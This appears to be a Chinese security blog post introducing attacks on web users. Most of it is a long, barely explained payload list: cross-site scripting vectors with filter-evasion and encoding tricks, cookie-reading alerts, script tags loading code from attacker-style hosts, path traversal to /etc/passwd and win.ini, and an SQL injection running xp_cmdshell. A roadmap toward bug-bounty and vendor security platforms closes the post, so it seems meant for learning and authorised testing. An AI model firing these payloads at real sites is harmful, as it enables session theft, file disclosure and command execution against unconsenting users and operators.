# 原创
：  【web-攻击用户】（9.1）XSS基础知识-运用示例

# 【web-攻击用户】（9.1）XSS基础知识-运用示例

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）XSS基础知识（√）
（2）XSS常见运用（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、攻击用户](#%E4%B8%80%E3%80%81%E6%94%BB%E5%87%BB%E7%94%A8%E6%88%B7)

[简介：](#%E7%AE%80%E4%BB%8B%EF%BC%9A)

[ XSS基础知识点：](#%C2%A0XSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A)

---


## 一、攻击用户

> 
<h3>简介：</h3>
1、绝大多数针对Web应用程序的攻击主要以服务器端应用程序为攻击目标，许多这类攻击会侵害到其他用户，如盗窃其他用户数据的SQL注入攻击。但攻击者所使用的基本攻击方法是以无法预料的方式与服务器进行交互的， 目的是执行未授权操作并非法访问数据。

2、因为攻击者的主要对象是应用程序的其他用户。服务器端应用程序仍然存在所有相关漏洞，然而，攻击者利用应用程序的一些行为执行针对其他终端用户的恶意操作。这些操作可能会造成一些与其他攻击相同的后果， 如会 话劫持、未授权操作和披露个人信息，记录键击、执行任意命令

3、尽管许多这种类型的漏洞今天依然存在， 但数量逐渐减小并且变得更加难以利用。然而即使是最为注政安全的应用程序也仍然包含许多可轻易发现的客户端缺陷。此外应用程序的服务器端以有限、可控的方式运行，而客户端可使用任意数量的各种浏览器技术（包括各种版本），由此客户端面临大范围可成功实施的攻击向量

4、客户端攻击成为以Web安全的主要关注焦点（间谍软件、钓鱼攻击和木马等名词）。针对Web应用程序用户的攻击也日益成为有利可图的犯罪行为。如果可以攻破用户，就不必再去入侵系统


> 
<h3>XSS基础知识点：</h3>
[【XSS跨站合集】反射型、存储型、DOM类XSS原理；输出在HTML、CSS、Javascript代码中<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.1.9/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M7J4"/>https://blog.csdn.net/qq_53079406/article/details/123694180?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166122429816781790744143%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166122429816781790744143&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-123694180-null-null.nonecase&amp;utm_term=xss&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/123694180?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166122429816781790744143%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166122429816781790744143&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-123694180-null-null.nonecase&amp;utm_term=xss&amp;spm=1018.2226.3001.4450)


---


---


## 二、XSS运用

> 
<h3> 1、示例：</h3>
<pre><code>1'"()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;prompt(915149)&lt;/ScRiPt&gt;

&lt;svg/onload=alert(1)&gt;
 
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
'&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
='&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
&lt;script&gt;alert(vulnerable)&lt;/script&gt;
 
%3Cscript%3Ealert('XSS')%3C/script%3E
 
&lt;script&gt;alert('XSS')&lt;/script&gt;
 
&lt;img src="javascript:alert('XSS')"&gt;
 
%0a%0a&lt;script&gt;alert(\"Vulnerable\")&lt;/script&gt;.jsp
 
%22%3cscript%3ealert(%22xss%22)%3c/script%3e
 
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
 
%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
 
%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
 
%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
 
&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
 
&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
 
a.jsp/&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
 
a?&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
 
"&gt;&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
 
';exec%20master..xp_cmdshell%20'dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt'--&amp;&amp;
 
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
 
%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;
 
%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID={SESSION_ID}&amp;SESSION_ID=
 
&lt;IMG src="javascript:alert('XSS');"&gt;
 
&lt;IMG src=javascript:alert('XSS')&gt;
 
&lt;IMG src=JaVaScRiPt:alert('XSS')&gt;
 
&lt;IMG src=JaVaScRiPt:alert("XSS")&gt;
 
&lt;IMG src=javascript:alert('XSS')&gt;
 
&lt;IMG src=javascript:alert('XSS')&gt;
 
&lt;IMG src=javascript:alert('XSS')&gt;
 
&lt;IMG src="jav ascript:alert('XSS');"&gt;
 
&lt;IMG src="jav ascript:alert('XSS');"&gt;
 
&lt;IMG src="jav ascript:alert('XSS');"&gt;
 
"&lt;IMG src=java\0script:alert(\"XSS\")&gt;";' &gt; out
 
&lt;IMG src=" javascript:alert('XSS');"&gt;
 
&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;
 
&lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
 
&lt;BODY ONLOAD=alert('XSS')&gt;
 
&lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
 
&lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
 
&lt;BGSOUND src="javascript:alert('XSS');"&gt;
 
&lt;br size="&amp;{alert('XSS')}"&gt;
 
&lt;LAYER src="http://xss.ha.ckers.org/a.js"&gt;&lt;/layer&gt;
 
&lt;LINK REL="stylesheet" href="javascript:alert('XSS');"&gt;
 
&lt;IMG src='vbscript:msgbox("XSS")'&gt;
 
&lt;IMG src="mocha:[code]"&gt;
 
&lt;IMG src="livescript:[code]"&gt;
 
&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
 
&lt;IFRAME src=javascript:alert('XSS')&gt;&lt;/IFRAME&gt;
 
&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert('XSS')&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;
 
&lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
 
&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"&gt;
 
&lt;DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');"&gt;
 
&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
 
&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
 
&lt;IMG STYLE='xss:expre\ssion(alert("XSS"))'&gt;
 
&lt;STYLE TYPE="text/javascript"&gt;alert('XSS');&lt;/STYLE&gt;
 
&lt;STYLE TYPE="text/css"&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A class="XSS"&gt;&lt;/A&gt;
 
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
 
&lt;BASE href="javascript:alert('XSS');//"&gt;
 
getURL("javascript:alert('XSS')")
 
a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
 
&lt;XML src="javascript:alert('XSS');"&gt;
 
"&gt; &lt;BODY&gt;&lt;SCRIPT&gt;function a(){alert('XSS');}&lt;/SCRIPT&gt;&lt;"
 
&lt;SCRIPT src="http://xss.ha.ckers.org/xss.jpg"&gt;&lt;/SCRIPT&gt;
 
&lt;IMG src="javascript:alert('XSS')"
 
&lt;!--#exec cmd="/bin/echo '&lt;SCRIPT SRC'"--&gt;&lt;!--#exec cmd="/bin/echo
'=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;'"--&gt;
 
&lt;IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"&gt;
 
&lt;SCRIPT a="&gt;" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;
 
&lt;SCRIPT ="&gt;" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;
 
&lt;SCRIPT a="&gt;" '' src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;
 
&lt;SCRIPT "a='&gt;'" src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;
 
&lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT src="http://xss.ha.ckers.org/a.js"&gt;&lt;/SCRIPT&gt;
 
&lt;A href=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;
 
&lt;IMG SRC=javascript:alert(‘XSS’)&gt;
 
&lt;IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;
 
&lt;IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt;&lt;/img&gt;
 
&lt;img src=x onerror=”&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041″&gt;
 
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
 
&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
 
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
 
&lt;IMG SRC=”jav ascript:alert(‘XSS’);”&gt;
 
&lt;IMG SRC=”jav&amp;#x0A;ascript:alert(‘XSS’);”&gt;
 
&lt;IMG SRC=” &amp;#14;  javascript:alert(‘XSS’);”&gt;
 
&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;
 
&lt;IMG SRC=”javascript:alert(‘XSS’)”
 
&lt;/script&gt;&lt;script&gt;alert(‘XSS’);&lt;/script&gt;
 
&lt;INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”&gt;
 
&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;
 
&lt;svg/onload=alert('XSS')&gt;
 
&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;
 
&lt;BGSOUND SRC="javascript:alert('XSS');"&gt;
 
&lt;BR SIZE="&amp;{alert('XSS')}"&gt;
 
&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
 
&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE&gt;
 
&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"&gt;
 
&lt;STYLE&gt;.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
 
&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
 
&lt;XSS STYLE="behavior: url(xss.htc);"&gt;
 
&lt;IFRAME SRC="javascript:alert('XSS');"&gt;&lt;/IFRAME&gt;
 
&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:alert('XSS');"&gt;&lt;/FRAMESET&gt;
 
&lt;TABLE&gt;&lt;TD BACKGROUND="javascript:alert('XSS')"&gt;
 
&lt;DIV STYLE="width: expression(alert('XSS'));"&gt;
 
&lt;SCRIPT a="&gt;" SRC="httx://xss.rocks/xss.js"&gt;&lt;/SCRIPT&gt;
 
&lt;script&gt;alert(/xss/)&lt;/script&gt;
 
&lt;svg onload=alert(document.domain)&gt;
 
&lt;img src=document.domain onerror=alert(document.domain)&gt;
 
&lt;M onmouseover=alert(document.domain)&gt;M
 
&lt;marquee onscroll=alert(document.domain)&gt;
 
&lt;a href=javascript:alert(document.domain)&gt;M&lt;/a&gt;
 
&lt;body onload=alert(document.domain)&gt;
 
&lt;details open ontoggle=alert(document.domain)&gt;
 
&lt;embed src=javascript:alert(document.domain)&gt;
 
&lt;script&gt;alert(1)&lt;/script&gt;
 
&lt;sCrIpT&gt;alert(1)&lt;/sCrIpT&gt;
 
&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
 
&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;
 
&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
 
&lt;img src=1 onerror=alert(1)&gt;
 
&lt;iMg src=1 oNeRrOr=alert(1)&gt;
 
&lt;ImG src=1 OnErRoR=alert(1)&gt;
 
&lt;img src=1 onerror="alert(&amp;quot;M&amp;quot;)"&gt;
 
&lt;marquee onscroll=alert(1)&gt;
 
&lt;mArQuEe OnScRoLl=alert(1)&gt;
 
&lt;MaRqUeE oNsCrOlL=alert(1)&gt;
 
&lt;a href=javascript:/0/,alert(%22M%22)&gt;M&lt;/a&gt;
 
&lt;a href=javascript:/00/,alert(%22M%22)&gt;M&lt;/a&gt;
 
&lt;a href=javascript:/000/,alert(%22M%22)&gt;M&lt;/a&gt;
 
&lt;a href=javascript:/M/,alert(%22M%22)&gt;M&lt;/a&gt;
 
&lt;base href=javascript:/M/&gt;&lt;a href=,alert(1)&gt;M&lt;/a&gt;
 
&lt;base href=javascript:/M/&gt;&lt;iframe src=,alert(1)&gt;&lt;/iframe&gt;
 
&lt;/textarea&gt;&lt;script&gt;var a=1//@ sourceMappingURL=//xss.site&lt;/script&gt;
 
"&gt;&lt;img src=x onerror=alert(document.cookie)&gt;.gif
 
&lt;div style="background-image:url(javascript:alert(/xss/))"&gt;
 
&lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
 
&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;
 
&lt;iframe src="data:text/html,&lt;iframe src=javascript:alert('M')&gt;&lt;/iframe&gt;"&gt;&lt;/iframe&gt;
 
&lt;iframe src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;
 
&lt;iframe srcdoc=&lt;svg/o&amp;#x6E;load&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;&lt;/iframe&gt;
 
&lt;iframe src=https://baidu.com width=1366 height=768&gt;&lt;/iframe&gt;
 
&lt;iframe src=javascript:alert(1) width=1366 height=768&gt;&lt;/iframe
 
&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;
 
&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;M
 
&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=M&gt;
 
&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=M&gt;
 
&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=1&gt;
 
&lt;META HTTP-EQUIV="Link" Content="&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet"&gt;</code></pre>



---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

